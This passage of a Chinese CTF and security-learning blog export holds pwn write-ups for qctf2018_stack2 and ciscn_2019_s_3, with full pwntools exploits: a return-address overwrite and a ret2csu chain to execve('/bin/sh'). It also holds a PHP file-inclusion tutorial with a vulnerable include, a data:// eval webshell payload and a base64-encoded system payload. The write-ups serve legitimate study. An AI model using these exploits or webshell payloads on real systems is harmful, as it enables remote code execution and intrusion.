class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x080485cb</span></span><br><span class="line">payload = p32(shell_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Give your name plz: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011731.png" alt="image-20240219194037922" style="zoom: 67%;" />

<h1 id="qctf2018-stack2"><a href="#qctf2018-stack2" class="headerlink" title="qctf2018_stack2"></a><code>qctf2018_stack2</code></h1><h2 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h2><p>通过本题的学习与收获有：</p>
<ol>
<li>在<code>ida</code>中计算的偏移量有时候会有错误，如果在思路正确啥的都正确的时候还打不通，并且找不到错误在哪儿，一定要在<code>gdb</code>中重新算一下偏移量。</li>
</ol>
<h2 id="保护-源码"><a href="#保护-源码" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011873.png" alt="image-20240307161634907" style="zoom:80%;" />

<p>源码：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011674.png" alt="image-20240307161947166" style="zoom:67%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011001.png" alt="image-20240307162150734" style="zoom:80%;" />

<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>​	程序中有后门函数，代码比较长，不过我们仔细分析一下就能找到漏洞点，下图这里，一个索引越界的漏洞。我们可以控制<code>v5</code>为<code>v13</code>起始地址距离装返回地址的地址的偏移量，控制<code>v7</code>为后门函数地址，便可覆盖返回地址为后门函数地址。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011439.png" alt="image-20240307162715000"></p>
<p>​	接下来我们需要确定偏移量。一开始我是在<code>ida</code>中计算的偏移量，这个<code>var_70</code>就是<code>v13</code>，偏移量为<code>0x74</code>。不过本题在<code>ida</code>看的偏移量是错误的，我们需要动态调试一下。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011193.png" alt="image-20240307163736180" style="zoom:80%;" />

<p>下图中，<code>0xffffd010</code>是<code>v7</code>的起始地址</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252010737.png" alt="image-20240307164308647"></p>
<p>下图中，<code>0xffffd0ac</code>是装<code>main</code>函数返回地址的栈地址</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252010240.png" alt="image-20240307164417694"></p>
<p>​	<code>v7</code>到<code>esp</code>的偏移为<code>0x9c</code>，<code>v7</code>距离<code>v13</code>的偏移为<code>0x88-0x70 = 0x18</code>，故<code>v13</code>距离<code>esp</code>的偏移为<code>0x9c-0x18 = 0x84</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252010731.png" alt="image-20240307164926323"></p>
<p>​	最后还有一个地方也是我一开始没有注意到的，<code>v13[]</code>是<code>char</code>类型的，我们一次只能往地址里写一个字符也就是一个字节，后门函数地址<code>0x0804859b</code>有<code>4</code>个字节，所以我们要分<code>4</code>次写入。</p>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./stack2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26404</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;5. exit\n&#x27;)</span></span><br><span class="line">backdoor_addr = [<span class="number">0x9b</span>,<span class="number">0x85</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line">offset = <span class="number">0x84</span></span><br><span class="line"><span class="comment">#p.sendline(3)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;5. exit&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;change:&quot;</span>,<span class="built_in">str</span>(offset+i))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;new number:&quot;</span>,<span class="built_in">str</span>(backdoor_addr[i]))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;5. exit&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252009547.png" alt="image-20240310143745724"></p>
]]></content>
      <categories>
        <category>pwn学习总结</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>关于ret2csu的一道题</title>
    <url>/2024/07/10/%E5%85%B3%E4%BA%8Eret2csu%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/</url>
    <content><![CDATA[<p><code>BUU</code>：<code>ciscn_2019_s_3</code></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>检查保护，开了<code>NX</code>保护</p>
<span id="more"></span>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101108593.png" alt="image-20240223192404259"></p>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_read(<span class="number">0</span>, buf, <span class="number">0x400u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, <span class="number">0x30u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	程序中有两个系统调用，<code>read</code>可栈溢出，程序中没有后门函数。但是我们看到了下面这个，<code>3bh</code>是<code>64</code>位程序<code>execve</code>的系统调用号，程序中有系统调用则肯定有<code>syscall</code>即我们可以利用<code>gadgets</code>布置<code>execve</code>的参数，然后<code>syscall</code>获得<code>shell</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101109280.png" alt="image-20240223193124425"></p>
<p>​	系统调用<code>execve</code>，我们必须要知道<code>/bin/sh</code>的地址。本题中，<code>buf</code>的长度为<code>16</code>个字节，而<code>write</code>打印<code>0x30</code>个字节，又因为<code>buf</code>在栈上，所以<code>buf</code>下面的一些栈中的数据也会被打印出来。</p>
<p>​	我们填满<code>buf</code>的<code>16</code>个字节，然后发送<code>vuln</code>函数的第一个指令的地址，执行流会重新执行一遍<code>vuln</code>函数。发送<code>payload = b&#39;/bin/sh\x00&#39;+b&#39;a&#39;*8+p64(vuln_addr)</code>，然后看栈中的内容，其中<code>0x7ffd3e0cdce8</code>是栈地址同时也能被泄漏。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101109881.png" alt="image-20240223220610682"></p>
<p><code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_02_content = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_02_content  -----&gt; &#x27;</span>,<span class="built_in">hex</span>(stack_02_content))</span><br><span class="line">binsh_addr = stack_02_content-<span class="number">0x148</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr  -----&gt; &#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br></pre></td></tr></table></figure>

<p>​	接下来就是传参，不过我们没有直接找到<code>rdx</code>相关的<code>gadget</code>地址，好吧，其实这就是道关于<code>ret2csu</code>类型的题。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101110328.png" alt="image-20240710111035299" style="zoom:80%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101111199.png" alt="image-20240710111108172" style="zoom:80%;" />

<p>​	下面是<code>csu</code>片段，我们就是要利用这两个片段，对寄存器进行各种操作，最后使<code>rdx</code>中的值为<code>0</code>（<code>execve</code>的第<code>3</code>个参数）。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101111960.png" alt="image-20240223193956921"></p>
<p>​	<code>csu</code>②都是一些<code>pop</code>，重要的是怎么绕过<code>csu</code>①，首先我们要弄懂<code>csu</code>①中的汇编代码是什么意思。其中，<code>call</code>指令是调用函数，这里的<code>[]</code>是间接寻址，<code>call  [r12+rbx*8]</code>这个指令的意思是调用一个函数，这个函数在哪，这个函数的地址在<code>r12+rbx*8</code>这个地址里装着。也就是说，如果<code>r12</code>和<code>rbx</code>的值分别为<code>0x123456</code>和<code>0</code>，<code>0x123456</code>又指向<code>0x400123</code>这个地址，那么我们要调用的函数的地址不是<code>0x123456</code>而是<code>0x400123</code>。</p>
<p>​	<code>cmp</code>指令用于比较两个操作数的值，<code>cmp  rbx,rbp</code>指令的意思是比较<code>rbx</code>和<code>rbp</code>这两个寄存器的值。如果<code>rbx</code>和<code>rbp</code>的值不相等，那么<code>jnz</code>会跳转到相应的地址执行，反之执行流继续执行下一条指令。</p>
<p><code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">csu1_addr = <span class="number">0x400580</span></span><br><span class="line">csu2_addr = <span class="number">0x40059a</span></span><br><span class="line">term_proc_lastone_addr = <span class="number">0x600e50</span></span><br><span class="line"></span><br><span class="line">payload = p64(csu2_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(term_proc_lastone_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#                           rbx    rbp        r12                     r13   r14     r15</span></span><br><span class="line">payload += p64(csu1_addr)</span><br></pre></td></tr></table></figure>

<p>​	我们在<code>ida</code>中看到<code>term_proc</code>是一个空函数，其地址为<code>0x4005b4</code>，当然这个肯定不是我们想要的，我们想要的是哪个地址指向<code>0x4005b4</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101112897.png" alt="image-20240223200400679"></p>
<p>在<code>gdb</code>中，我们利用<code>search -p 0x4005b4</code>这个命令看到<code>0x600e50</code>这个地址中装的是<code>0x4005b4</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101112143.png" alt="image-20240223200329635"></p>
<p>​	一开始按照上面的<code>payload</code>发送一直打不通，调试的时候发现，调用完这个空函数后会<code>ret</code>到返回地址<code>0x40058d</code>也就是<code>csu</code>①中的<code>add     rbx, 1</code>指令，后面会影响栈的有<code>add   rsp,8</code>和<code>6</code>个<code>pop</code>指令，所以我们还需要再发送<code>7*8</code>个垃圾数据。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101112790.png" alt="image-20240224101044851"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101113922.png" alt="image-20240224101247650"></p>
<p>修改后<code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">csu1_addr = <span class="number">0x400580</span></span><br><span class="line">csu2_addr = <span class="number">0x40059a</span></span><br><span class="line">term_proc_lastone_addr = <span class="number">0x600e50</span></span><br><span class="line">payload = p64(csu2_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(term_proc_lastone_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu1_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400501</span></span><br><span class="line">mov_rax_addr = <span class="number">0x4004e2</span></span><br><span class="line">payload += p64(mov_rax_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(syscall_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./s3&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28982</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_02_content = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_02_content  -----&gt; &#x27;</span>,<span class="built_in">hex</span>(stack_02_content))</span><br><span class="line">binsh_addr = stack_02_content-<span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr  -----&gt; &#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">csu1_addr = <span class="number">0x400580</span></span><br><span class="line">csu2_addr = <span class="number">0x40059a</span></span><br><span class="line">term_proc_lastone_addr = <span class="number">0x600e50</span></span><br><span class="line">payload += p64(csu2_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(term_proc_lastone_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu1_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400501</span></span><br><span class="line">mov_rax_addr = <span class="number">0x4004e2</span></span><br><span class="line">payload += p64(mov_rax_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(syscall_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101113867.png" alt="image-20240122145901772"></p>
<h2 id="更换libc"><a href="#更换libc" class="headerlink" title="更换libc"></a>更换<code>libc</code></h2><p>​	本题中本地和远程的<code>libc</code>不一样，所以偏移量也不同，本题中本地的是<code>0x148</code>远程为<code>0x118</code>。我们可以利用<code>pathelf</code>和<code>glibc-all-in-one</code>更换本地依赖的<code>libc</code>。</p>
<p>​	首先用<code>strings ./libc-2.23.so | grep &quot;GNU&quot;</code>命令查看远程<code>libc</code>的<code>GLIBC</code>版本</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101114720.png" alt="image-20240224000900918"></p>
<p>然后在<code>glibc-all-in-one</code>中找到对应的版本号，<code>64</code>位程序对应<code>amd64</code>，<code>32</code>位程序对应<code>i386</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101114715.png" alt="image-20240224001212635"></p>
<p>执行<code>./download 2.23-0ubuntu11.3_amd64</code>，便会在<code>glibc-all-all-in-one</code>目录下的<code>libs</code>目录中生成一个新目录</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101114024.png" alt="image-20240224001750545"></p>
<p>最后便可利用<code>patchelf</code>中<code>--set-interpreter </code>和<code>--add-needed</code>选项分别设置链接器和依赖的路径即可。</p>
]]></content>
      <categories>
        <category>pwn学习总结</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含基础知识学习</title>
    <url>/2024/10/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>文件包含漏洞（File Inclusion Vulnerability）是一种常见的 Web  安全漏洞，它允许攻击者通过控制输入参数，使应用程序包含并执行本地或远程服务器上的任意文件内容。这种漏洞通常出现在 PHP  等动态语言中，当应用程序使用用户输入作为文件路径参数，且未对输入进行严格验证和过滤时，攻击者可以利用这一点，包含恶意文件（如本地配置文件、远程恶意脚本等），从而获取敏感信息、执行任意代码或进一步攻击系统。</p>
<span id="more"></span>

<h1 id="基础知识学习"><a href="#基础知识学习" class="headerlink" title="基础知识学习"></a>基础知识学习</h1><p>下面是几个示例，是文件包含函数最基础的用法，用来解析文件。</p>
<h4 id="包含服务器文件（远程包含）"><a href="#包含服务器文件（远程包含）" class="headerlink" title="包含服务器文件（远程包含）"></a>包含服务器文件（远程包含）</h4><p>需要在<code>phpini</code>中配置：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">On</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">On</span></span><br></pre></td></tr></table></figure>

<p>访问<code>http://localhost/eclipse_workspace/firstpro/exp.php?sh=http://www.baidu.com</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102016894.png" alt="image-20250116152345994"></p>
<h4 id="包含本地文件"><a href="#包含本地文件" class="headerlink" title="包含本地文件"></a>包含本地文件</h4><p>可以解析<code>php</code>文件，并将其他类型的文件，其内容当成<code>php</code>代码解析</p>
<p>被包含文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># test.txt</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;dir&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>包含文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exp.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>绝对路径访问：</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">?fie=D:\Users\<span class="keyword">install</span>\<span class="keyword">test</span>.txt</span><br></pre></td></tr></table></figure>

<p><code>file://</code>协议访问：</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">file</span>=<span class="keyword">file</span>://D:\Users\<span class="keyword">install</span>\<span class="keyword">test</span>.txt</span><br></pre></td></tr></table></figure>

<h4 id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a><code>allow_url_include</code></h4><p>​	在_php_ 中，<code>allow_url_include</code>是一个配置指令，用来控制是否允许使用<code>include</code>或<code>require</code>语句，来包含并执行外部文件。<code>allow_url_include</code>可以在<code>php.ini</code>文件中设置，或者在运行时通过<code>ini_set()</code>函数动态设置。以下是两个设置的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//init</span></span><br><span class="line">allow_url_include = On</span><br><span class="line"><span class="comment">//php复制</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;allow_url_include&#x27;</span>, <span class="string">&#x27;1&#x27;</span>); <span class="comment">// 开启</span></span><br></pre></td></tr></table></figure>

<h4 id="动态执行代码"><a href="#动态执行代码" class="headerlink" title="动态执行代码"></a>动态执行代码</h4><p>可以直接执行php代码，如下：</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sh&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">#蚁剑可直连</span></span><br></pre></td></tr></table></figure>

<p>绕过一些过滤，将要执行的代码进行base64加密：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">data:<span class="regexp">//</span>text<span class="regexp">/plain;base64,PD9waHAgc3lzdGVtKCdkaXInKTs/</span>Pg==</span><br></pre></td></tr></table></figure>

<h4 id="结合file-get-contents利用"><a href="#结合file-get-contents利用" class="headerlink" title="结合file_get_contents利用"></a>结合<code>file_get_contents</code>利用</h4><p><code>file_get_contents()</code>函数用来读取文件内容，伪协议<code>data://</code>可以结合该函数利用。</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="meta">#flag文件</span></span><br><span class="line"><span class="built_in">flag</span>&#123;This-is-the-<span class="built_in">flag</span>-<span class="number">123</span>&#125;</span><br></pre></td></tr></table></figure>

<p><code>file_get_contents()</code>函数可以直接读取文件内容，传入文件名即可：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exp.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102014809.png" alt="image-20250124153021803"></p>
<p>利用<code>data://</code>伪协议覆盖要读的内容：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102015083.png" alt="image-20250124153340202"></p>
<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><h2 id="php-filter伪协议"><a href="#php-filter伪协议" class="headerlink" title="php:&#x2F;&#x2F;filter伪协议"></a>php:&#x2F;&#x2F;filter伪协议</h2><p>官方介绍：</p>
<blockquote>
<p>php:&#x2F;&#x2F;filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似  readfile()、 file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</p>
</blockquote>
<p>使用方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php://filter(/read或/write)/过滤器|过滤器/resource=要过滤的数据流</span><br></pre></td></tr></table></figure>

<p><strong>filter后面可以套多层目录。</strong>过滤器可以设置多个，使用管道符<code>|</code>分隔，按照从左到右的顺序依次使用相应的过滤器进行过滤处理。</p>
<p>过滤器分类</p>
<ul>
<li><p>字符串过滤器：以string开头，常见过滤器有rot13、toupper、tolower、strip_tags等。string.strip_tags自PHP 7.3.0起废弃。</p>
</li>
<li><p>转换过滤器：以convert开头，主要含三类，分别是base64的编码转换，quoted-printable的编码转换，iconv字符编码转换。</p>
<ol>
<li><p>base64的编码为base64_encode和base64_decode；</p>
</li>
<li><p>quoted-printable为quoted-printable-encode可打印字符引用编码，解码为quoted-printable-decode但是无该解码过滤器；</p>
</li>
<li><p>在激活 <a href="https://www.php.net/manual/zh/book.iconv.php">iconv</a>的前提下可以使用<code>convert.iconv.*</code>压缩过滤器，等同于用iconv()处理所有的流数据。</p>
<ul>
<li>.utf-8.utf-7：将utf8编码转换utf7编码</li>
<li>.utf8.utf16：将utf8编码转换utf16编码</li>
<li>.SJIS*.UCS-4*</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#格式: convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</span></span><br><span class="line"><span class="comment">#&lt;input-encoding&gt;和&lt;output-encoding&gt;有以下几种:</span></span><br><span class="line"><span class="comment">#UCS-4*			UCS-4BE			UCS-4LE*			UCS-2			UCS-2BE			UCS-2LE</span></span><br><span class="line"><span class="comment">#UTF-32*		UTF-32BE*		UTF-32LE*			UTF-16*			UTF-16BE*		UTF-16LE*</span></span><br><span class="line"><span class="comment">#UTF-7			UTF7-IMAP		UTF-8*				ASCII*</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.UCS-2.UCS-2LE/resource=data://text/plain,abcd&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>压缩过滤器：zlib.deflate压缩&amp;zlib.inflate解压、bzip2.compress压缩&amp;bzip.decompress解压</p>
</li>
<li><p>加密过滤器：特别适用于文件或数据流的加密，自PHP7.1.0起废弃。</p>
</li>
</ul>
<p>参考文章：</p>
<p>[php filter伪协议 - Tranquility](<a href="https://leekosss.github.io/2023/08/24/php">https://leekosss.github.io/2023/08/24/php</a> filter伪协议&#x2F;#convert-iconv)</p>
<h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a><code>data://</code>协议</h2><p><code>data://</code>伪协议是一种特殊的协议，用于在PHP中将数据以流的形式处理。它属于PHP的<em>Stream Wrapper</em> 机制的一部分，允许开发者通过类似文件的方式操作数据，而无需依赖实际的文件系统或外部资源。</p>
<p>作用：该伪协议允许开发者将任意数据作为流来读取或写入。使用前提：<strong>allow_url_fopen ：on且allow_url_include：on</strong></p>
<p>下面是一个例子，来理解该协议</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$stream</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;data://text/plain,Hello World!&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$fr</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$stream</span>,<span class="number">12</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$stream</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fr</span>;</span><br><span class="line"><span class="comment">#输出:</span></span><br><span class="line"><span class="comment">//Hello World!</span></span><br></pre></td></tr></table></figure>

<h4 id="file"><a href="#file" class="headerlink" title="file://"></a><code>file://</code></h4><p>用来读取本地服务器上的文件。</p>
<h4 id="data"><a href="#data" class="headerlink" title="data://"></a><code>data://</code></h4><p>**<code>data://text/plain</code>**是_PHP_ 中<code>file_get_contents</code>函数支持的一种特殊协议，用于将字符串作为文件内容来处理。在<code>data://</code>协议后面，可以指定_MIME_ 类型（在这里是<code>text/plain</code>），然后是逗号和数据本身。数据可以是任何有效的字符串，它将被当作文件内容来读取。</p>
<p>php5.2.0起，如果传入的数据是PHP代码，就会<strong>执行代码</strong>。使用方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">data://text/plain;<span class="built_in">base64</span>,payload</span><br><span class="line"><span class="comment"># payload是base64编码后的代码</span></span><br></pre></td></tr></table></figure>

<p>下面给出一个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;This is a demo.\n&quot;</span>;</span><br><span class="line"><span class="variable">$stream</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;data://text/plain,&#x27;</span>.<span class="variable">$a</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$fa</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$stream</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$stream</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fa</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$stream</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;data://text/plain,Hello World!&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$fr</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$stream</span>,<span class="number">12</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$stream</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fr</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//    输出结果</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">This is a demo.</span></span><br><span class="line"><span class="comment">Hello 